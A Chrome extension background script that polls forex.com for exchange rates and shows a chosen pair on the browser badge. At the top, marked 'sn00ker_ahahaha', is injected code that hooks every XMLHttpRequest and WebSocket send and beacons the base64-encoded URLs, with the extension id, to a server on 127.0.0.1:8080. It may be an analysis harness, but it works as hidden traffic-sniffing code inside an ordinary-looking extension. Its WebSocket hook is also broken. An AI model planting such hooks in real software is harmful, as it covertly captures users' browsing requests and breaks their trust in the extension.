function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
const defr=100;
const defg=150;
const defb=120;
const timeout = 15000;
const default_filter = "USD EUR PLN CHF GBP CZK"
const default_extra = "CHF/PLN GBP/PLN PLN/CZK CZK/PLN"
var req = new XMLHttpRequest();
var popupRefresh = null;
var rates = null;
var curre = localStorage.currency || "EUR/USD"
var r = parseInt(localStorage.r) || defr
var g = parseInt(localStorage.g) || defg
var b = parseInt(localStorage.b) || defb
var fil = localStorage.fil || default_filter
var extra = localStorage.extra || default_extra
var sdp = localStorage.sdp==1
var popupRefresh=null;
var bid, ask;

function refresh() {
	if (rates==null)  return
	for (var x,i=0; x=rates.d[i]; i++) if (x.A==curre) break;
	if (x) {
		bid = parseFloat(x.B)
		ask = parseFloat(x.C)
		var s=''
		if (sdp) {
			var val=(bid+ask)/2.0
			for (var l=3; l>=0; l--) {
				s=val.toFixed(l)
				if (s.length<=4)  break
			}
		} else {
			s=((bid+ask)/2).toString().replace('.','')
			if (s[0]=='0') s=s.substr(1);
		}
		chrome.browserAction.setBadgeText({text: s.substr(0,4)});
		chrome.browserAction.setTitle({title: x.A+": "+x.B+" / "+x.C });
	} else {
		chrome.browserAction.setBadgeText({text: "???"});
		chrome.browserAction.setTitle({title: 'Unknown Currency Code: '+curre});
	}
}

function add_extra_pairs() {
	rts = new Array()
	rts["USD"] = { B : 1.0, C : 1.0}
	for (var i=0; i<rates.d.length; i++) {
		var r1 = rates.d[i].A.substr(0,3)
		var r2 = rates.d[i].A.substr(4,3)
		if (r1=="USD") {
			rts[r2] = { B : 1.0/rates.d[i].B, C : 1.0/rates.d[i].C}
		} else if (r2=="USD") {
			rts[r1] = { B : 0.0+rates.d[i].B, C : 0.0+rates.d[i].C}
		}
	}
	exps = extra.split(" ")
	for (var i=0; i<exps.length; i++) {
		var pair = exps[i]
		if (pair.length==7 && pair[3]=='/') {
			var r1 = pair.substr(0,3)
			var r2 = pair.substr(4)
			if (typeof(rts[r1])!="undefined" && typeof(rts[r2])!="undefined") {
				var rec = {A:pair, B:rts[r1].B/rts[r2].B, C:rts[r1].C/rts[r2].C}
				//console.log("add_pair", pair, r1, r2, rec)
				rates.d.push(rec)
			} else {
				console.log("ignore", pair)
			}
		}
	}
}

function getnr() {
	req.open("POST", "http://www.forex.com/uk/UIService.asmx/GetUserRates3", true)
	req.onerror = function() {
		setTimeout(getnr,timeout);
		chrome.browserAction.setBadgeText({text: "?"});
	}
	req.onload = function() {
		setTimeout(getnr,timeout);
		var rr = JSON.parse( req.responseText );
		if (rr!=null) {
			rates = rr
			//addchf2pln()
			if (extra!="") {
				add_extra_pairs()
			}
			refresh()
		} else {
			chrome.browserAction.setBadgeText({text: "..."});
		}
		if (popupRefresh != null) {
			try {
				popupRefresh();
			} catch (e) {
				popupRefresh=null;
			}
		}
	}
	req.setRequestHeader("Content-type", "application/json");
	req.send("{}");
}
function setcol() {
	chrome.browserAction.setBadgeBackgroundColor({color:[r, g, b, 255]});
}
getnr();
setcol();
